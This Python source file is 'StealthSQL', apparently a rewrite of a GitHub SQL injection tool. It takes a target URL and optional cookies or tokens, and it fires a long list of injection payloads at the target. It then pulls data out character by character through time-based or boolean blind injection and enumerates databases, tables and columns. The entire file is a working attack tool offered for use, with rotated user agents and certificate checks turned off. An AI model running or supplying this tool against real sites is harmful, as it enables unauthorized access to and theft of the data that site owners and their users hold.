#!/usr/bin/env python3
"""
******************************************
*                StealthSQL              *
*             SQL Injection Tool         *
*                  v2.0.1                *
*      ----------------------------      *
*                        by @ImKKingshuk *
* Github- https://github.com/ImKKingshuk *
******************************************

Rewritten in Python by 187ctf
"""

import sys
import time
import random
import urllib.parse
from datetime import timedelta
from typing import List, Tuple, Optional

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("Error: 'requests' module is required. Install it with: pip install requests")
    sys.exit(1)


class Colors:
    """ANSI color codes for terminal output"""
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[0;34m'
    MAGENTA = '\033[0;35m'
    CYAN = '\033[0;36m'
    WHITE = '\033[1;37m'
    BOLD = '\033[1m'
    NC = '\033[0m'  # No Color


class StealthSQL:
    """Main class for SQL Injection testing tool"""

    def __init__(self):
        # Global variables to track results
        self.sqli_detected = False
        self.sqli_payloads_found = []
        self.extracted_data = []
        self.enumeration_results = []
        self.script_success = True
        self.error_messages = []

        # Configuration
        self.url = ""
        self.session_cookie = ""
        self.auth_token = ""
        self.proxy = None
        self.custom_headers = {}
        self.user_agent = ""
        self.method = ""
        self.time_sleep = 3
        self.default_length = 0
        self.output = ""

    def print_banner(self):
        """Display the tool banner"""
        import os
        os.system('clear' if os.name != 'nt' else 'cls')

        banner = [
            "******************************************",
            "*                StealthSQL              *",
            "*             SQL Injection Tool         *",
            "*                  v2.0.1                *",
            "*      ----------------------------      *",
            "*                        by @ImKKingshuk *",
            "* Github- https://github.com/ImKKingshuk *",
            "******************************************",
            "",
            "        Python version by 187ctf          "
        ]

        try:
            width = os.get_terminal_size().columns
        except:
            width = 80

        print(f"{Colors.CYAN}", end='')
        for line in banner:
            padding = (width - len(line)) // 2
            print(" " * padding + line)
        print(f"{Colors.NC}")

    def print_separator(self):
        """Print a separator line"""
        print(f"{Colors.BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.NC}")

    def print_info(self, message: str):
        """Print an info message"""
        print(f"{Colors.CYAN}[ℹ]{Colors.NC} {message}")

    def print_success(self, message: str):
        """Print a success message"""
        print(f"{Colors.GREEN}[✓]{Colors.NC} {message}")

    def print_error(self, message: str):
        """Print an error message"""
        print(f"{Colors.RED}[✗]{Colors.NC} {message}")

    def print_warning(self, message: str):
        """Print a warning message"""
        print(f"{Colors.YELLOW}[!]{Colors.NC} {message}")

    def print_attempt(self, message: str):
        """Print an attempt message"""
        print(f"{Colors.MAGENTA}[→]{Colors.NC} Trying: {Colors.WHITE}{message}{Colors.NC}")

    def generate_user_agent(self) -> str:
        """Generate a random user agent string"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
            "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0"
        ]
        return random.choice(user_agents)

    def make_request(self, url: str) -> str:
        """Make an HTTP request with configured headers and proxy"""
        headers = {'User-Agent': self.user_agent}

        if self.session_cookie:
            headers['Cookie'] = self.session_cookie

        if self.auth_token:
            headers['Authorization'] = f'Bearer {self.auth_token}'

        if self.custom_headers:
            headers.update(self.custom_headers)

        proxies = None
        if self.proxy:
            proxies = {
                'http': self.proxy,
                'https': self.proxy
            }

        try:
            response = requests.get(url, headers=headers, proxies=proxies, verify=False, timeout=30)
            return response.text
        except Exception as e:
            self.error_messages.append(f"Request failed: {str(e)}")
            return ""

    def color_print(self):
        """Clear screen and print output with separator"""
        import os
        os.system('clear' if os.name != 'nt' else 'cls')
        self.print_separator()
        print(f"{Colors.GREEN}{self.output}{Colors.NC}")
        self.print_separator()
        time.sleep(0.5)

    def color_print_attempt(self, attempt: str):
        """Clear screen, print output and show current attempt"""
        import os
        os.system('clear' if os.name != 'nt' else 'cls')
        self.print_separator()
        print(f"{Colors.GREEN}{self.output}{Colors.NC}")
        self.print_separator()
        self.print_attempt(attempt)

    def encode_payload(self, payload: str) -> str:
        """URL encode the payload"""
        return urllib.parse.quote(payload)

    def get_query_output(self, query: str, row_number: int = 0, is_count: bool = False) -> str:
        """Extract data using blind SQL injection character by character"""
        flag = True
        query_output = ""

        if is_count:
            dictionary = "0123456789"
        else:
            dictionary = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~"

        while flag:
            flag = False
            for j in range(1, 1000):
                for i in range(len(dictionary)):
                    temp_query_output = query_output + dictionary[i]
                    self.color_print_attempt(temp_query_output)

                    if self.method == "T":
                        # Time-based blind SQL injection
                        if is_count:
                            payload = f"' AND IF(MID((SELECT COUNT(*) FROM ({query}) AS totalCount),{j},1)='{dictionary[i]}',SLEEP({self.time_sleep}),0)--+"
                            print()
                            self.print_info("Getting rows count...")
                            print()
                        else:
                            payload = f"' AND IF(MID(({query} LIMIT {row_number},1),{j},1)='{dictionary[i]}',SLEEP({self.time_sleep}),0)--+"
                            print()
                            self.print_info(f"Scanning row {row_number + 1}/{self.total_rows}...")
                            print()

                        full_url = self.url + self.encode_payload(payload)
                        start_time = time.time()
                        self.make_request(full_url)
                        elapsed_time = int(time.time() - start_time)

                        if elapsed_time >= self.time_sleep:
                            flag = True
                            break

                    elif self.method == "B":
                        # Boolean-based blind SQL injection
                        if is_count:
                            payload = f"' AND (MID((SELECT COUNT(*) FROM ({query}) AS totalCount),{j},1))!='{dictionary[i]}'--+"
                            print()
                            self.print_info("Getting rows count...")
                            print()
                        else:
                            payload = f"' AND (MID(({query} LIMIT {row_number},1),{j},1))!='{dictionary[i]}'--+"
                            print()
                            self.print_info(f"Scanning row {row_number + 1}/{self.total_rows}...")
                            print()

                        full_url = self.url + self.encode_payload(payload)
                        response = self.make_request(full_url)
                        current_length = len(response)

                        if current_length != self.default_length:
                            flag = True
                            break

                    flag = False

                if flag:
                    query_output = temp_query_output
                    continue
                break

        return query_output

    def blind_sql_injection(self, method: str, query_input: str, time_sleep: int = 3):
        """Perform blind SQL injection attack"""
        self.method = method
        self.time_sleep = time_sleep
        initial_time = time.time()

        self.print_separator()
        if method == "B":
            self.print_info("Using Boolean Blind SQL Injection")
            self.default_length = len(self.make_request(self.url))
        else:
            self.print_info(f"Using Time-Based Blind SQL Injection with {time_sleep}s sleep time")
            time.sleep(1)
        self.print_separator()

        # Get total number of rows
        total_rows_str = self.get_query_output(query_input, 0, True)
        self.total_rows = int(total_rows_str) if total_rows_str.isdigit() else 0
        self.output += f"\n{Colors.CYAN}Total rows:{Colors.NC} {Colors.WHITE}{self.total_rows}{Colors.NC}\n"
        self.color_print()

        # Extract each row
        total_output = ""
        for i in range(self.total_rows):
            current_output = self.get_query_output(query_input, i)
            self.output += f"\n{Colors.GREEN}[✓]{Colors.NC} Query output: {Colors.WHITE}{current_output}{Colors.NC}"
            total_output = self.output + "\n"
            self.extracted_data.append(current_output)
            self.color_print()

        if self.total_rows > 1:
            print()
            self.print_success("All rows retrieved successfully!")
            print()
            self.output = total_output
            self.color_print()

        total_time = int(time.time() - initial_time)
        self.print_separator()
        self.print_success(f"Total time: {str(timedelta(seconds=total_time))}")
        self.print_separator()

    def detect_sqli(self, url: str) -> bool:
        """Detect SQL injection vulnerabilities"""
        payloads = [
            # Basic string-based payloads
            "'",
            "''",
            "`",
            "``",
            ",",
            '"',
            '""',
            "/",
            "//",
            "\\",
            "\\\\",
            ";",
            "' or \"",
            "-- or #",
            "' OR '1",
            "' OR 1 -- -",
            '" OR "" = "',
            '" OR 1 = 1 -- -',
            "' OR '' = '",
            "'='",
            "'LIKE'",
            "'=0--+",
            " OR 1=1",
            "' OR 'x'='x",
            "' AND id IS NULL; --",
            "'''''''''''''UNION SELECT '2",
            "%00",
            "/*…*/",
            "+",
            "||",
            "%",
            "@variable",
            "@@variable",

            # Numeric payloads
            "AND 1",
            "AND 0",
            "AND true",
            "AND false",
            "1-false",
            "1-true",
            "1*56",
            "-2",

            # ORDER BY payloads
            "1' ORDER BY 1--+",
            "1' ORDER BY 2--+",
            "1' ORDER BY 3--+",
            "1' ORDER BY 1,2--+",
            "1' ORDER BY 1,2,3--+",

            # GROUP BY payloads
            "1' GROUP BY 1,2,--+",
            "1' GROUP BY 1,2,3--+",
            "' GROUP BY columnnames having 1=1 --",

            # UNION-based payloads
            "-1' UNION SELECT 1,2,3--+",
            "' UNION SELECT sum(columnname ) from tablename --",
            "-1 UNION SELECT 1 INTO @,@",
            "-1 UNION SELECT 1 INTO @,@,@",

            # Subquery payloads
            "1 AND (SELECT * FROM Users) = 1",
            "' AND MID(VERSION(),1,1) = '5';",
            "' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --",

            # Time-based payloads
            ",(select * from (select(sleep(10)))a)",
            "%2c(select%20*%20from%20(select(sleep(10)))a)",
            "';WAITFOR DELAY '0:0:30'--",

            # Original payloads
            "' OR '1'='1",
            "' OR '1'='1' -- ",
            '" OR "1"="1',
            '" OR "1"="1" -- ',
            "' AND 1=1 -- "
        ]

        print()
        self.print_separator()
        self.print_info("Detecting SQL injection vulnerabilities...")
        self.print_separator()

        for payload in payloads:
            self.print_attempt(f"Testing payload: {payload}")
            full_url = url + self.encode_payload(payload)
            response = self.make_request(full_url)

            if "error" in response.lower() or "syntax" in response.lower():
                self.print_warning(f"Potential SQL Injection found with payload: {payload}")
                self.sqli_detected = True
                self.sqli_payloads_found.append(payload)

        if self.sqli_detected:
            return True
        else:
            self.print_success("No SQL Injection vulnerabilities detected.")
            return False

    def enumerate(self, query: str, data_type: str):
        """Enumerate databases, tables, or columns"""
        enum_start_idx = len(self.extracted_data)

        print()
        self.print_separator()

        if data_type == "databases":
            query = "SELECT schema_name FROM information_schema.schemata"
            self.print_info("Enumerating databases...")
        elif data_type == "tables":
            query = f"SELECT table_name FROM information_schema.tables WHERE table_schema = '{query}'"
            self.print_info(f"Enumerating tables in database: {query}")
        elif data_type == "columns":
            query = f"SELECT column_name FROM information_schema.columns WHERE table_name = '{query}'"
            self.print_info(f"Enumerating columns in table: {query}")
        else:
            self.print_error("Invalid data type for enumeration.")
            return

        self.print_separator()

        self.blind_sql_injection(self.method, query)

        # Store enumeration results
        enum_count = len(self.extracted_data) - enum_start_idx
        if enum_count > 0:
            self.enumeration_results.append(f"{data_type}: {enum_count} items found")

    def generate_report(self, format_type: str):
        """Generate a report in the specified format"""
        report_file = f"sqli_report.{format_type}"

        try:
            with open(report_file, 'w', encoding='utf-8') as f:
                # Remove ANSI color codes for the report
                import re
                clean_output = re.sub(r'\033\[[0-9;]+m', '', self.output)
                f.write(clean_output)

            self.print_success(f"Report generated: {report_file}")
        except Exception as e:
            self.print_error(f"Failed to generate report: {str(e)}")

    def print_final_summary(self):
        """Print a comprehensive summary of the execution"""
        print("\n")
        self.print_separator()
        print(f"{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════════{Colors.NC}")
        print(f"{Colors.BOLD}{Colors.CYAN}                  RÉSUMÉ DE L'EXÉCUTION                {Colors.NC}")
        print(f"{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════════{Colors.NC}")
        self.print_separator()
        print()

        # SQL Injection Detection Status
        print(f"{Colors.BOLD}{Colors.WHITE}[1] Détection de vulnérabilité SQL Injection:{Colors.NC}")
        if self.sqli_detected:
            self.print_success("Vulnérabilité SQL Injection détectée!")
            print(f"    {Colors.CYAN}└─{Colors.NC} Payloads réussis: {Colors.WHITE}{len(self.sqli_payloads_found)}{Colors.NC}")
            for payload in self.sqli_payloads_found:
                print(f"       {Colors.YELLOW}•{Colors.NC} {payload}")
        else:
            self.print_warning("Aucune vulnérabilité SQL Injection détectée")
        print()

        # Extracted Data Summary
        print(f"{Colors.BOLD}{Colors.WHITE}[2] Extraction de données:{Colors.NC}")
        if self.extracted_data:
            self.print_success("Données extraites avec succès!")
            print(f"    {Colors.CYAN}└─{Colors.NC} Nombre total d'entrées: {Colors.WHITE}{len(self.extracted_data)}{Colors.NC}")
            print()
            print(f"    {Colors.YELLOW}Données récupérées:{Colors.NC}")
            for count, data in enumerate(self.extracted_data, 1):
                if data:
                    print(f"       {Colors.GREEN}[{count}]{Colors.NC} {Colors.WHITE}{data}{Colors.NC}")
        else:
            self.print_error("Aucune donnée extraite")
        print()

        # Enumeration Results
        print(f"{Colors.BOLD}{Colors.WHITE}[3] Résultats de l'énumération:{Colors.NC}")
        if self.enumeration_results:
            self.print_success("Énumération effectuée")
            for result in self.enumeration_results:
                print(f"    {Colors.CYAN}└─{Colors.NC} {Colors.WHITE}{result}{Colors.NC}")
        else:
            self.print_info("Aucune énumération effectuée")
        print()

        # Overall Status
        self.print_separator()
        print(f"{Colors.BOLD}{Colors.WHITE}[4] Statut global:{Colors.NC}")
        if self.sqli_detected and self.extracted_data:
            print(f"    {Colors.GREEN}{Colors.BOLD}✓ SUCCÈS{Colors.NC} - Le script a fonctionné et des données ont été extraites!")
            self.script_success = True
        elif self.sqli_detected:
            print(f"    {Colors.YELLOW}{Colors.BOLD}⚠ PARTIEL{Colors.NC} - Vulnérabilité détectée mais données non extraites")
            self.script_success = False
        else:
            print(f"    {Colors.RED}{Colors.BOLD}✗ ÉCHEC{Colors.NC} - Aucune vulnérabilité détectée ou données extraites")
            self.script_success = False
        print()

        # Error Messages (if any)
        if self.error_messages:
            print(f"{Colors.BOLD}{Colors.WHITE}[5] Erreurs rencontrées:{Colors.NC}")
            for error in self.error_messages:
                self.print_error(error)
            print()

        self.print_separator()
        print(f"{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════════{Colors.NC}")
        self.print_separator()

    def run(self):
        """Main execution flow"""
        self.print_banner()

        self.print_separator()
        self.print_info("Configuration Setup")
        self.print_separator()
        print()

        # Get target URL
        self.url = input(f"{Colors.CYAN}[?]{Colors.NC} Enter the target URL: ").strip().rstrip('/')
        self.print_success(f"Target URL set: {self.url}")
        print()

        # Optional configurations
        self.session_cookie = input(f"{Colors.CYAN}[?]{Colors.NC} Session cookie (press Enter to skip): ").strip()
        if self.session_cookie:
            self.print_success("Session cookie configured")

        self.auth_token = input(f"{Colors.CYAN}[?]{Colors.NC} Authentication token (press Enter to skip): ").strip()
        if self.auth_token:
            self.print_success("Auth token configured")

        proxy_input = input(f"{Colors.CYAN}[?]{Colors.NC} Proxy (press Enter to skip): ").strip()
        if proxy_input:
            self.proxy = proxy_input
            self.print_success(f"Proxy configured: {self.proxy}")

        custom_headers_input = input(f"{Colors.CYAN}[?]{Colors.NC} Custom headers, comma separated (press Enter to skip): ").strip()
        if custom_headers_input:
            for header in custom_headers_input.split(','):
                if ':' in header:
                    key, value = header.split(':', 1)
                    self.custom_headers[key.strip()] = value.strip()
            self.print_success("Custom headers configured")

        print()
        self.print_separator()

        # Auto-generate User-Agent
        self.user_agent = self.generate_user_agent()
        self.print_success(f"Auto-generated User-Agent: {Colors.YELLOW}{self.user_agent}{Colors.NC}")
        print()
        ua_confirm = input(f"{Colors.CYAN}[?]{Colors.NC} Use this User-Agent? (y/n, press Enter for yes): ").strip().lower() or 'y'
        if ua_confirm != 'y':
            custom_ua = input(f"{Colors.CYAN}[?]{Colors.NC} Enter custom User-Agent: ").strip()
            if custom_ua:
                self.user_agent = custom_ua
                self.print_success("Custom User-Agent set")

        print()
        self.print_separator()
        self.print_info("Attack Configuration")
        self.print_separator()
        print()

        # Get attack configuration
        while True:
            self.method = input(f"{Colors.CYAN}[?]{Colors.NC} SQLi type [T]ime-based / [B]oolean: ").strip().upper()
            query_input = input(f"{Colors.CYAN}[?]{Colors.NC} SQL query: ").strip()

            if '*' not in query_input:
                self.print_success("Query configured successfully")
                break
            self.print_error("Please specify a column name!")

        print()
        verbose = input(f"{Colors.CYAN}[?]{Colors.NC} Enable verbose mode? (y/n): ").strip().lower()
        if verbose == 'y':
            self.print_warning("Verbose mode enabled (not implemented in Python version)")

        # Run detection and exploitation
        print()
        self.detect_sqli(self.url)
        self.blind_sql_injection(self.method, query_input)

        # Enumeration
        print()
        self.print_separator()
        enum_choice = input(f"{Colors.CYAN}[?]{Colors.NC} Enumerate databases/tables/columns? (databases/tables/columns/none): ").strip().lower()
        if enum_choice != "none" and enum_choice in ["databases", "tables", "columns"]:
            enum_name = input(f"{Colors.CYAN}[?]{Colors.NC} Enter name for enumeration (empty for databases): ").strip()
            self.enumerate(enum_name, enum_choice)

        # Report generation
        print()
        self.print_separator()
        generate_report_choice = input(f"{Colors.CYAN}[?]{Colors.NC} Generate report? (y/n): ").strip().lower()
        if generate_report_choice == 'y':
            report_format = input(f"{Colors.CYAN}[?]{Colors.NC} Report format (html/json/csv): ").strip().lower()
            self.generate_report(report_format)

        print()
        self.print_separator()
        self.print_success("StealthSQL execution completed!")
        self.print_separator()

        # Display final summary
        self.print_final_summary()


def main():
    """Entry point of the script"""
    try:
        tool = StealthSQL()
        tool.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!]{Colors.NC} Script interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}[✗]{Colors.NC} An error occurred: {str(e)}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
